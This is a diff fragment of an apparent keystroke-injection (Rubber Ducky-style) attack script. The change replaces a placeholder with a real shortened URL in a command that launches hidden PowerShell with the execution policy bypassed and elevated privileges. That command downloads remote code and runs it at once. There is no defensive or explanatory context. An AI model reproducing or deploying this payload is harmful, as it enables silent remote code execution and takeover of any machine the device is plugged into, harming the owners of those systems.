@@ -34,7 +34,7 @@ GUI r
 DELAY 500
 
 REM Execute PowerShell hidden with administrative privileges
-STRING powershell -w h -NoP -Ep Bypass -Command "irm <LINK> | iex"
+STRING powershell -w h -NoP -Ep Bypass -Command "irm https://bit.ly/41jdL2S | iex"
 CTRL-SHIFT ENTER
 DELAY 1000
 LEFT
